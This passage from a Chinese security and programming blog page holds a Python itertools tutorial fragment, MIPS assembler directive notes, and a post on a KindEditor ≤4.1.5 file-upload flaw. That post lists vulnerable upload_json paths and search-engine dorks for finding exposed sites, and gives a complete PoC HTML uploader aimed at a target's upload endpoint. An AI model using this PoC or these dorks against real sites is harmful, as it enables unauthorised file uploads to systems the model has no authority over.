r))</span><br><span class="line"> </span><br><span class="line">def random_combination(iterable, r):</span><br><span class="line">    <span class="string">"Random selection from itertools.combinations(iterable, r)"</span></span><br><span class="line">    pool = tuple(iterable)</span><br><span class="line">    n = len(pool)</span><br><span class="line">    indices = sorted(random.sample(xrange(n), r))</span><br><span class="line">    <span class="built_in">return</span> tuple(pool[i] <span class="keyword">for</span> i <span class="keyword">in</span> indices)</span><br><span class="line"> </span><br><span class="line">def random_combination_with_replacement(iterable, r):</span><br><span class="line">    <span class="string">"Random selection from itertools.combinations_with_replacement(iterable, r)"</span></span><br><span class="line">    pool = tuple(iterable)</span><br><span class="line">    n = len(pool)</span><br><span class="line">    indices = sorted(random.randrange(n) <span class="keyword">for</span> i <span class="keyword">in</span> xrange(r))</span><br><span class="line">    <span class="built_in">return</span> tuple(pool[i] <span class="keyword">for</span> i <span class="keyword">in</span> indices)</span><br><span class="line"> </span><br><span class="line">def tee_lookahead(t, i):</span><br><span class="line">    <span class="string">""</span><span class="string">"Inspect the i-th upcomping value from a tee object</span></span><br><span class="line"><span class="string">    while leaving the tee object at its current position.</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">    Raise an IndexError if the underlying iterator doesn't</span></span><br><span class="line"><span class="string">    have enough values.</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">    "</span><span class="string">""</span></span><br><span class="line">    <span class="keyword">for</span> value <span class="keyword">in</span> islice(t.__copy__(), i, None):</span><br><span class="line">        <span class="built_in">return</span> value</span><br><span class="line">    raise IndexError(i)</span><br></pre></td></tr></table></figure></p>
<p>自定义扩展</p>
<p>将序列按大小切分,更好的性能代码如下:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">from itertools import chain, islice</span><br><span class="line">def chunks(iterable, size, format=iter):</span><br><span class="line">    it = iter(iterable)</span><br><span class="line">    while True:</span><br><span class="line">        yield format(chain((it.next(),), islice(it, size - 1)))</span><br><span class="line">  </span><br><span class="line"> </span><br><span class="line">&gt;&gt;&gt; l = [&quot;a&quot;, &quot;b&quot;, &quot;c&quot;, &quot;d&quot;, &quot;e&quot;, &quot;f&quot;, &quot;g&quot;]</span><br><span class="line">&gt;&gt;&gt; for chunk in chunks(l, 3, tuple):...</span><br><span class="line">        print chunk...</span><br><span class="line">(&quot;a&quot;, &quot;b&quot;, &quot;c&quot;)</span><br><span class="line">(&quot;d&quot;, &quot;e&quot;, &quot;f&quot;)</span><br><span class="line">(&quot;g&quot;,)</span><br></pre></td></tr></table></figure></p>
<p>补充</p>
<p>迭代工具，你最好的朋友</p>
<p>迭代工具模块包含了操做指定的函数用于操作迭代器。想复制一个迭代器出来？链接两个迭代器？以one liner（这里的one-liner只需一行代码能搞定的任务)用内嵌的列表组合一组值？不使用list创建Map/Zip？···，你要做的就是 import itertools，举个例子吧：</p>
<p>四匹马赛跑到达终点排名的所有可能性：代码如下:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; horses = [1, 2, 3, 4]</span><br><span class="line">&gt;&gt;&gt; races = itertools.permutations(horses)</span><br><span class="line">&gt;&gt;&gt; <span class="built_in">print</span>(races)</span><br><span class="line">&lt;itertools.permutations object at 0xb754f1dc]]&gt;</span><br><span class="line">&gt;&gt;&gt; <span class="built_in">print</span>(list(itertools.permutations(horses)))</span><br><span class="line">[(1, 2, 3, 4),</span><br><span class="line"> (1, 2, 4, 3),</span><br><span class="line"> (1, 3, 2, 4),</span><br><span class="line"> (1, 3, 4, 2),</span><br><span class="line"> (1, 4, 2, 3),</span><br><span class="line"> (1, 4, 3, 2),</span><br><span class="line"> (2, 1, 3, 4),</span><br><span class="line"> (2, 1, 4, 3),</span><br><span class="line"> (2, 3, 1, 4),</span><br><span class="line"> (2, 3, 4, 1),</span><br><span class="line"> (2, 4, 1, 3),</span><br><span class="line"> (2, 4, 3, 1),</span><br><span class="line"> (3, 1, 2, 4),</span><br><span class="line"> (3, 1, 4, 2),</span><br><span class="line"> (3, 2, 1, 4),</span><br><span class="line"> (3, 2, 4, 1),</span><br><span class="line"> (3, 4, 1, 2),</span><br><span class="line"> (3, 4, 2, 1),</span><br><span class="line"> (4, 1, 2, 3),</span><br><span class="line"> (4, 1, 3, 2),</span><br><span class="line"> (4, 2, 1, 3),</span><br><span class="line"> (4, 2, 3, 1),</span><br><span class="line"> (4, 3, 1, 2),</span><br><span class="line"> (4, 3, 2, 1)]</span><br></pre></td></tr></table></figure></p>
<p>理解迭代的内部机制： 迭代(iteration）就是对可迭代对象（iterables，实现了<strong>iter</strong>()方法）和迭代器（iterators，实现了<strong>next</strong>()方法）的一个操作过程。可迭代对象是任何可返回一个迭代器的对象，迭代器是应用在迭代对象中迭代的对象，换一种方式说的话就是：iterable对象的<strong>iter</strong>()方法可以返回iterator对象，iterator通过调用next()方法获取其中的每一个值(译者注)，读者可以结合Java API中的 Iterable接口和Iterator接口进行类比。</p>

        
        
        <p class="article-more-link">
          
       </p>
    </div>
    <footer class="article-footer clearfix">
<div class="article-catetags">

<div class="article-categories">
  <span></span>
  <a class="article-category-link" href="/categories/编程开发/">编程开发</a>►<a class="article-category-link" href="/categories/编程开发/Python/">Python</a>
</div>


</div>




<div class="comments-count">
	
</div>

</footer>


    </article>






   
    
    <article class="post-expand [layout]" itemprop="articleBody"> 
        <header class="article-info clearfix">
  <h1 itemprop="name">
    
      <a href="/2016/01/01/kindeditor4.1.5漏洞/" title="kindeditor4.1.5漏洞" itemprop="url">kindeditor4.1.5漏洞</a>
  </h1>
  <p class="article-author">By
       
		<a href="/about" title="小虫" target="_blank" itemprop="author">小虫</a>
		
  <p class="article-time">
    <time datetime="2016-01-01T02:10:50.000Z" itemprop="datePublished"> 发表于 2016-01-01</time>
    
  </p>
</header>
    <div class="article-content">
        
        <p>漏洞存在于 kindeditor 编辑器里，你能上传. txt 和. html 文件，支持 php/asp/jsp/asp.net</p>
<p>漏洞存在于小于等于 kindeditor4.1.5 编辑器中</p>
<p>根本脚本语言自定义不同的上传地址，上传之前有必要验证文件 upload_json.* 的存在<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">/asp/upload_json.asp</span><br><span class="line">/asp.net/upload_json.ashx</span><br><span class="line">/jsp/upload_json.jsp</span><br><span class="line">/php/upload_json.php</span><br></pre></td></tr></table></figure></p>
<p>关键字：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">allinurl:/examples/uploadbutton.html</span><br><span class="line">allinurl:/php/upload_json.php / .asp / .jsp</span><br></pre></td></tr></table></figure></p>
<h3 id="poc"><a href="#poc" class="headerlink" title="poc"></a>poc</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;&lt;head&gt;</span><br><span class="line"></span><br><span class="line">&lt;title&gt;kindeditor&lt;=4.1.5文件上传&lt;/title&gt;</span><br><span class="line"></span><br><span class="line">&lt;script src=<span class="string">"https://www.heimao.me/kindeditor/kindeditor-min.js"</span>&gt;&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line"></span><br><span class="line">KindEditor.ready(<span class="keyword">function</span>(K) &#123;</span><br><span class="line"></span><br><span class="line">var uploadbutton = K.uploadbutton(&#123;</span><br><span class="line"></span><br><span class="line">button : K(<span class="string">'#uploadButton'</span>)[0],</span><br><span class="line"></span><br><span class="line">fieldName : <span class="string">'imgFile'</span>,</span><br><span class="line"></span><br><span class="line">url : <span class="string">'https://www.heimao.me/kindeditor/asp/upload_json.asp?dir=file'</span>,</span><br><span class="line"></span><br><span class="line">afterUpload : <span class="keyword">function</span>(data) &#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (data.error === 0) &#123;</span><br><span class="line"></span><br><span class="line">var url = K.formatUrl(data.url, <span class="string">'absolute'</span>);</span><br><span class="line"></span><br><span class="line">K(<span class="string">'#url'</span>).val(url);&#125;</span><br><span class="line"></span><br><span class="line">&#125;,</span><br><span class="line"></span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">uploadbutton.fileBox.change(<span class="keyword">function</span>(e) &#123;</span><br><span class="line"></span><br><span class="line">uploadbutton.submit();</span><br><span class="line"></span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">&lt;/script&gt;&lt;/head&gt;&lt;body&gt;</span><br><span class="line"></span><br><span class="line">&lt;div class=<span class="string">"upload"</span>&gt;</span><br><span class="line"></span><br><span class="line">&lt;input class=<span class="string">"ke-input-text"</span> <span class="built_in">type</span>=<span class="string">"text"</span> id=<span class="string">"url"</span> value=<span class="string">""</span> <span class="built_in">readonly</span>=<span class="string">"readonly"</span> /&gt;</span><br><span class="line"></span><br><span class="line">&lt;input <span class="built_in">type</span>=<span class="string">"button"</span> id=<span class="string">"uploadButton"</span> value=<span class="string">"Upload"</span> /&gt;</span><br><span class="line"></span><br><span class="line">&lt;/div&gt;</span><br><span class="line"></span><br><span class="line">&lt;/body&gt;</span><br><span class="line"></span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
        
        
        <p class="article-more-link">
          
       </p>
    </div>
    <footer class="article-footer clearfix">
<div class="article-catetags">

<div class="article-categories">
  <span></span>
  <a class="article-category-link" href="/categories/渗透测试/">渗透测试</a>►<a class="article-category-link" href="/categories/渗透测试/上传/">上传</a>
</div>


</div>




<div class="comments-count">
	
</div>

</footer>


    </article>






   
    
    <article class="post-expand [layout]" itemprop="articleBody"> 
        <header class="article-info clearfix">
  <h1 itemprop="name">
    
      <a href="/2016/01/01/mips汇编时常用的宏指令/" title="mips汇编时常用到的宏指令" itemprop="url">mips汇编时常用到的宏指令</a>
  </h1>
  <p class="article-author">By
       
		<a href="/about" title="小虫" target="_blank" itemprop="author">小虫</a>
		
  <p class="article-time">
    <time datetime="2016-01-01T02:10:50.000Z" itemprop="datePublished"> 发表于 2016-01-01</time>
    
  </p>
</header>
    <div class="article-content">
        
        <p>MIPS公司最初设计的汇编器是一个宏伟的计划，它能完成智能宏的扩展，延迟槽填充，窥孔优化以及尽可能减少流水线堵塞而对复杂指令序列进行指令重组。不过其他的汇编器简单多了，因为高级语言的先进编译器技术已经可以完成这些优化工作。为了保持汇编代码的兼容性，同时为了让汇编程序员轻松一点，所有的MIPS汇编器至少实现下列功能：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">(1)进行宏展开</span><br><span class="line">(2)为了让分支和加载指令的延迟槽对程序员透明，能够在需要的地方自动插入nop指令</span><br><span class="line">(3)能够避免流水线在执行普通指令时出错。</span><br></pre></td></tr></table></figure></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">set</span> noreord/reorder</span><br></pre></td></tr></table></figure>
<p>默认汇编器处在reorder的模式下。该模式允许汇编器对指令进行重新排序，以避免流水线阻塞并获得更好的性能，在这种模式下，是不允许在代码中插入nop指令的。反之，在noreorder模式下，指令的顺序不会被更改也不会对代码进行任何优化。这样做的优点是程序员可以完全控制代码的顺序执行，缺点是必须手工对指令进行排序，并在分支和加载指令的延迟槽中填上有用的指令或nop指令如：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">.<span class="built_in">set</span>  noreorder</span><br><span class="line"></span><br><span class="line">lw t0,0(a0)</span><br><span class="line"></span><br><span class="line">nop         <span class="comment">#加载延迟槽</span></span><br><span class="line"></span><br><span class="line">sub t0,1</span><br><span class="line"></span><br><span class="line">bne t0,zero,loop</span><br><span class="line"></span><br><span class="line">nop         <span class="comment">#分支延迟槽</span></span><br><span class="line"></span><br><span class="line">.<span class="built_in">set</span> reorder</span><br></pre></td></tr></table></figure></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">set</span> volatile/ novolatile</span><br></pre></td></tr></table></figure>
<p>处在volatile区的所有存取指令都不会被移动位置(特别是存取指令之间的相对位置)。这一点对访问内存映射设备的寄存器非常重要。因为对于外围设备而言，读写的次序十分重要。另外对读状态寄存器也非常重要。因为想得到的状态都是最新的。举例来说，如果下面代码没有使用.set vilatile ，那么汇编器很有可能会对第二个lw指令移到指令的前面，因为这样可以填充第一条lw指令的延迟槽:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">.<span class="built_in">set</span>  volatile</span><br><span class="line">lw to,0(a0)</span><br><span class="line">sw t0,0(a1)</span><br><span class="line">lw t0,4(a0)</span><br><span class="line">.<span class="built_in">set</span> novolatile</span><br></pre></td></tr></table></figure></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">set</span> noat</span><br></pre></td></tr></table></figure>
<p>阻止汇编器将汇编代码翻译成二进制序列依赖at / $1 寄存器<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">set</span>  nomacro</span><br></pre></td></tr></table></figure></p>
<p>阻止汇编器将一条汇编代码翻译成多条指令</p>

        
        
        <p class="article-more-link">
          
       </p>
    </div>
    <footer class="article-footer clearfix">
<div class="article-catetags">

<div class="article-categories">
  <span></span>
  <a class="article-category-link" href="/categories/逆向工程/">逆向工程</a>►<a class="article-category-link" href="/categories/逆向工程/mips/">mips</a>
</div>


</div>




<div class="comments-count">
	
</div>

</footer>


    </article>







  <nav id="page-nav" class="clearfix">
    <a class="extend prev" rel="prev" href="/page/4/"><span></span>Prev</a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/3/">3</a><a class="page-number" href="/page/4/">4</a><span class="page-number current">5</span><a class="page-number" href="/page/6/">6</a><a class="page-number" href="/page/7/">7</a><a class="extend next" rel="next" href="/page/6/">Next<span></span></a>
  </nav>

</div>
      <div class="openaside"><a class="navbutton" href="#" title="显示侧边栏"></a></div>

<div id="asidepart">
<div class="closeaside"><a class="closebutton" href="#" title="隐藏侧边栏"></a></div>
<aside class="clearfix">

  


  
<div class="category-block">
  <h3 class="asidetitle">分类</h3>
     <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/SEO/">SEO</a><span class="category-list-count">3</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/SEO/反向代理/">反向代理</a><span class="category-list-count">3</span></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/代码审计/">代码审计</a><span class="category-list-count">1</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/代码审计/php代码审计/">php代码审计</a><span class="category-list-count">1</span></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/杂七杂八/">杂七杂八</a><span class="category-list-count">11</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/杂七杂八/hexo/">hexo</a><span class="category-list-count">2</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/杂七杂八/parrot/">parrot</a><span class="category-list-count">3</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/杂七杂八/rad-linux/">rad linux</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/杂七杂八/windows7/">windows7</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/杂七杂八/工具/">工具</a><span class="category-list-count">4</span></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/渗透测试/">渗透测试</a><span class="category-list-count">38</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/渗透测试/CMS/">CMS</a><span class="category-list-count">3</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/渗透测试/XSS/">XSS</a><span class="category-list-count">6</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/渗透测试/上传/">上传</a><span class="category-list-count">2</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/渗透测试/其他/">其他</a><span class="category-list-count">4</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/渗透测试/内网/">内网</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/渗透测试/工具/">工具</a><span class="category-list-count">3</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/渗透测试/提取/">提取</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/渗透测试/提权/">提权</a><span class="category-list-count">11</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/渗透测试/注入/">注入</a><span class="category-list-count">3</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/渗透测试/端口/">端口</a><span class="category-list-count">2</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/渗透测试/笔记/">笔记</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/渗透测试/资源/">资源</a><span class="category-list-count">1</span></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/编程开发/">编程开发</a><span class="category-list-count">7</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/编程开发/Python/">Python</a><span class="category-list-count">5</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/编程开发/javascript/">javascript</a><span class="category-list-count">2</span></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/逆向工程/">逆向工程</a><span class="category-list-count">1</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/逆向工程/mips/">mips</a><span class="category-list-count">1</span></li></ul></li></ul>
</div>


  

  <div class="linkslist">
  <p class="asidetitle">友情链接</p>
    <ul>
        
          <li>
            
            	<a href="https://coderq.com" target="_blank" title="一个面向程序员交流分享的新一代社区">码农圈</a>
            
          </li>
        
          <li>
            
            	<a href="https://dillinger.io" target="_blank" title="在线看makedown编译出的效果">makedown</a>
            
          </li>
        
          <li>
            
            	<a href="https://mochazz.github.io" target="_blank" title="一个审计大佬的博客">审计</a>
            
          </li>
        
          <li>
            
            	<a href="http://www.php.cn/course/74.html" target="_blank" title="php官方网站">php</a>
            
          </li>
        
          <li>
            
            	<a href="http://blog.51cto.com/simeon" target="_blank" title="一个经常发布资源大佬的博客">资源</a>
            
          </li>
        
          <li>
            
            	<a href="https://www.liaoxuefeng.com" target="_blank" title="学习python的个人博客">python</a>
            
          </li>
        
          <li>
            
            	<a href="https://www.kanxue.com" target="_blank" title="二进制安全学习窝">看雪</a>
            
          </li>
        
          <li>
            
            	<a href="www.secquan.org" target="_blank" title="常混的论坛">圈子</a>
            
          </li>
        
          <li>
            
            	<a href="https://www.2cto.com" target="_blank" title="各种渗透书籍随便挑">红黑联盟</a>
            
          </li>
        
          <li>
            
            	<a href="https://www.cnblogs.com" target="_blank" title="一个内网大佬的博客">linuxsec</a>
            
          </li>
        
          <li>
            
            	<a href="http://www.runoob.com" target="_blank" title="学习各种编程脚本的好地方">W3C</a>
            
          </li>
        
          <li>
            
            	<a href="http://www.91ri.org" target="_blank" title="内网挺可以">91安全</a>
            
          </li>
        
          <li>
            
            	<a href="http://www.kali.org.cn" target="_blank" title="kali linux">kali linux</a>
            
          </li>
        
          <li>
            
            	<a href="https://www.shiyanlou.com" target="_blank" title="实验楼">实验楼</a>
            
          </li>
        
    </ul>
</div>

  


  <div class="rsspart">
	<a href="/atom.xml" target="_blank" title="rss">RSS 订阅</a>
</div>

  <div class="weiboshow">
  <p class="asidetitle">新浪微博</p>
    <iframe width="100%" height="119" class="share_self"  frameborder="0" scrolling="no" src="http://widget.weibo.com/weiboshow/index.php?language=&width=0&height=119&fansRow=2&ptype=1&speed=0&skin=9&isTitle=1&noborder=1&isWeibo=0&isFans=0&uid=&verifier=b3593ceb&dpc=1"></iframe>
</div>


</aside>
</div>
    </div>
    <footer><div id="footer" >
	
	<div class="line">
		<span></span>
		<div class="author"></div>
	</div>
	
	
	<section class="info">
		<p> Hello ,I&#39;m Bug`小虫 Page in Google. <br/>
			This is my blog,believe it or not.</p>
	</section>
	 
	<div class="social-font" class="clearfix">
		
		<a href="http://weibo.com/2176287895" target="_blank" class="icon-weibo" title="微博"></a>
		
		
		
		
		
		
		
		
		
		
	</div>
			
		

		<p class="copyright">
		Powered by <a href="http://hexo.io" target="_blank" title="hexo">hexo</a> and Theme by <a href="https://github.com/wuchong/jacman" target="_blank" title="Jacman">Jacman</a> © 2018 
		
		<a href="/about" target="_blank" title="小虫">小虫</a>
		
		
		</p>
</div>
</footer>
    <script src="/js/jquery-2.0.3.min.js"></script>
<script src="/js/jquery.imagesloaded.min.js"></script>
<script src="/js/gallery.js"></script>
<script src="/js/jquery.qrcode-0.12.0.min.js"></script>

<script type="text/javascript">
$(document).ready(function(){ 
  $('.navbar').click(function(){
    $('header nav').toggleClass('shownav');
  });
  var myWidth = 0;
  function getSize(){
    if( typeof( window.innerWidth ) == 'number' ) {
      myWidth = window.innerWidth;
    } else if( document.documentElement && document.documentElement.clientWidth) {
      myWidth = document.documentElement.clientWidth;
    };
  };
  var m = $('#main'),
      a = $('#asidepart'),
      c = $('.closeaside'),
      o = $('.openaside');
  c.click(function(){
    a.addClass('fadeOut').css('display', 'none');
    o.css('display', 'block').addClass('fadeIn');
    m.addClass('moveMain');
  });
  o.click(function(){
    o.css('display', 'none').removeClass('beforeFadeIn');
    a.css('display', 'block').removeClass('fadeOut').addClass('fadeIn');      
    m.removeClass('moveMain');
  });
  $(window).scroll(function(){
    o.css("top",Math.max(80,260-$(this).scrollTop()));
  });
  
  $(window).resize(function(){
    getSize(); 
    if (myWidth >= 1024) {
      $('header nav').removeClass('shownav');
    }else{
      m.removeClass('moveMain');
      a.css('display', 'block').removeClass('fadeOut');
      o.css('display', 'none');
        
    }
  });
});
</script>












<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
<script src="/fancybox/jquery.fancybox.pack.js"></script>
<script type="text/javascript">
$(document).ready(function(){ 
  $('.article-content').each(function(i){
    $(this).find('img').each(function(){
      if ($(this).parent().hasClass('fancybox')) return;
      var alt = this.alt;
      if (alt) $(this).after('<span class="caption">' + alt + '</span>');
      $(this).wrap('<a href="' + this.src + '" title="' + alt + '" class="fancybox"></a>');
    });
    $(this).find('.fancybox').each(function(){
      $(this).attr('rel', 'article' + i);
    });
  });
  if($.fancybox){
    $('.fancybox').fancybox();
  }
}); 
</script>



<!-- Analytics Begin -->



<script>
var _hmt = _hmt || [];
(function() {
  var hm = document.createElement("script");
  hm.src = "//hm.baidu.com/hm.js?e6d1f421bbc9962127a50488f9ed37d1";
  var s = document.getElementsByTagName("script")[0]; 
  s.parentNode.insertBefore(hm, s);
})();
</script>



<!-- Analytics End -->

<!-- Totop Begin -->

	<div id="totop">
	<a title="返回顶部"><img src="/img/scrollup.png"/></a>
	</div>
	<script src="/js/totop.js"></script>

<!-- Totop End -->

<!-- MathJax Begin -->
<!-- mathjax config similar to math.stackexchange -->


<!-- MathJax End -->

<!-- Tiny_search Begin -->

<!-- Tiny_search End -->

  <script src="/live2dw/lib/L2Dwidget.min.js?0c58a1486de42ac6cc1c59c7d98ae887"></script><script>L2Dwidget.init({"model":"wanko","bottom":-30,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/"});</script></body>
 </html>
